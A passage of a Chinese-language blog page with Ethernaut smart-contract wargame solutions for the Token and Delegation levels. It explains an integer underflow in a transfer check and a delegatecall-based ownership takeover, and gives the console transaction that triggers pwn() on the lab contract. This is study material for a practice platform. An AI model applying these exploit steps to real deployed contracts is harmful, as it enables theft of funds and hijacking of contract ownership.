+<p>不难发现，这个合约没有用到<code>SafeMath</code>那么我们就要格外关注是否存在整数溢出型的漏洞。<br>不出意外：在transfer方法中<code>require(balances[msg.sender] - _value &gt;= 0)</code>使明显存在整数下溢的风险的。<br/><br>由于题目中说到我们一开始拥有20个token，那我们只需要向此合约发出交易，<code>_value&gt;20</code>即可使<code>balances[msg.sender] - _value</code> 发生下溢变成一个很大的值从而符合判定条件。</p>
+<ul>
+<li>解题思路</li>
+</ul>
+<ol>
+<li>在控制台调用transfer方法value为21即可<br><img src="../images/ethernaut/e05/01.png" alt=""></li>
+<li>此时查看我们的账户余额已经是一个相当大的值<br><img src="../images/ethernaut/e05/02.png" alt=""></li>
+<li>通关</li>
+</ol>
+</li>
+</ul>
+<h2 id="06-Delegation"><a href="#06-Delegation" class="headerlink" title="06 Delegation"></a>06 Delegation</h2><p>这道题考查对delegatecall()的认识<br>非常危险<br>先看代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner &#x3D; _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate &#x3D; Delegate(_delegateAddress);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) &#x3D; address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本题目的是要拿到合约的所有权，阅读代码后，其实就是想要通过<code>Delegation</code>合约调用<code>Delegate</code>中的<code>pwn()</code>函数，即可完成对<code>owner</code>的修改</p>
+<ul>
+<li>漏洞分析<br>我们注意到<code>Delegation</code>中的fallback()函数有<code>address(delegate).delegatecall(msg.data);</code>出现，而关于delegatecall的有关介绍可以参考我的另一篇博文，我们可以知道delegatecall函数是非常危险的，而且历史上已经多次被用于进行 attack vector. 使用它。<br/><br>我们在这道题当中只需要给<code>Delegation</code>合约转账，触发他的<code>fallback</code>函数并通过函数签名的方式传入<code>data</code>即可</li>
+</ul>
+<p>解题步骤：</p>
+<ol>
+<li>执行<code>contract.sendTransaction({data:web3.utils.keccak256(&quot;pwn()&quot;).slice(0,10)});</code>给当前合约赚一笔帐并指定data<br><img src="../images/ethernaut/e06/01.png" alt=""></li>
+<li>通关</li>
+</ol>
+
+                
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2022/06/24/ethernaut02/" data-toggle="tooltip" data-placement="top" title="ethernaut 题解 07-12">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2022/06/15/ReentryAttack/" data-toggle="tooltip" data-placement="top" title="ReentryAttack">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                <!-- tip start -->
+                
+                <div class="comment_notes_blank"></div>
+                <div class="visitor_notice">
+                    <img 
+                        src="/img/notice.png" 
+                        alt="notice"
+                        title="notice"/>
+                    <p class="notice">
+                        true
+                    </p>
+                </div>
+                
+
+                
+                <div class="comment_notes">
+                    <p>
+                        This is copyright.
+                    </p>
+                </div>
+                
+                <!-- tip end -->
+
+                <!-- Music start-->
+                
+                
+<link rel="stylesheet" href="/css/music-player/fonts/iconfont.css">
+
+
+<link rel="stylesheet" href="/css/music-player/css/reset.css">
+
+
+<link rel="stylesheet" href="/css/music-player/css/player.css">
+
+
+<div class="music-player">
+    <audio class="music-player__audio" ></audio>
+    <div class="music-player__main">
+        <div class="music-player__blur"></div>
+        <div class="music-player__disc">
+            <div class="music-player__image">
+                <img width="100%" src="" alt="">
+            </div>
+            <div class="music-player__pointer"><img width="100%" src="/img/cd_tou.png" alt=""></div>
+        </div>
+        <div class="music-player__controls">
+            <div class="music__info">
+                <h3 class="music__info--title">...</h3>
+                <p class="music__info--singer">...</p>
+            </div>
+            <div class="player-control">
+                <div class="player-control__content">
+                    <div class="player-control__btns">
+                        <div class="player-control__btn player-control__btn--prev"><i class="iconfont icon-prev"></i></div>
+                        <div class="player-control__btn player-control__btn--play"><i class="iconfont icon-play"></i></div>
+                        <div class="player-control__btn player-control__btn--next"><i class="iconfont icon-next"></i></div>
+                        <div class="player-control__btn player-control__btn--mode"><i class="iconfont icon-loop"></i></div>
+                    </div>
+                    <div class="player-control__volume">
+                        <div class="control__volume--icon player-control__btn"><i class="iconfont icon-volume"></i></div>
+                        <div class="control__volume--progress player_progress"></div>
+                    </div>
+                </div>
+                <div class="player-control__content">
+                    <div class="player__song--progress player_progress"></div>
+                    <div class="player__song--timeProgess nowTime">00:00</div>
+                    <div class="player__song--timeProgess totalTime">00:00</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script src="/js/music-player/utill.js"></script>
+
+
+<script src="/js/music-player/jquery.min.js"></script>
+
+<!-- netease; qqkg -->
+<!--
+<script src="/js/music-player/player.js?library=config.music.library.js"></script>
+-->
+<script src="../../../../js/music-player/player.js?library=netease&music=https://kg.qq.com/node/play?s=7deFpz7Z26Jmv7di&g_f=share_html"></script>
+                
+                <!-- Music end -->
+
+                <!-- Sharing -->
+                
+                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                <!--  css & js -->
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!-- Sharing -->
+
+                <!-- gitment start -->
+                
+                <!-- gitment end -->
+
+                <!-- 来必力City版安装代码 -->
+                
+                <!-- City版安装代码已完成 -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      
+        <aside id="sidebar">
+          <div id="toc" class="toc-article">
+          <strong class="toc-title">Contents</strong>
+          
+            
+              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Ethernaut靶场刷题记录-1-6"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Ethernaut靶场刷题记录(1-6)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#01-FallBack"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">01 FallBack</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#02-Fallout"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">02 Fallout</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#03-Coin-Flip"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">03 Coin Flip</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#04-Telephone"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">04 Telephone</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#05-Token"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">05 Token</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#06-Delegation"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">06 Delegation</span></a></li></ol></li></ol>
+            
+          
+          </div>
+        </aside>
+      
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#ethernaut" title="ethernaut">ethernaut</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+
+
+<style  type="text/css">
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/ThomasXu-blockchain">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Thomas_Xu 2022 
+                    <br>
+                    Powered by 
+                    <a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">
+                        <i>hexo-theme-snail</i>
+                    </a> | 
+                    <iframe name="star" style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
+                        width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- Search -->
+
+<script src="/js/search.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://dusign.net/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Search -->
+
+    <script type="text/javascript">      
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+            search_path = "search.xml";
+        }
+    var path = "/" + search_path;
+    searchFunc(path, 'local-search-input', 'local-search-result');
+    </script>
+
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+
+    
+        <!-- background effects line -->
+        
+
+        
+            <script type="text/javascript" src="/js/mouse-click.js" content='[&quot;🌱&quot;,&quot;just do it&quot;,&quot;🍀&quot;]' color='[&quot;rgb(121,93,179)&quot; ,&quot;rgb(76,180,231)&quot; ,&quot;rgb(184,90,154)&quot;]'></script>
+        
+
+        <!-- background effects end -->
+    
+
+    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
+    
+        <script src="/js/ribbonDynamic.js"></script>
+    
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+
+</html>
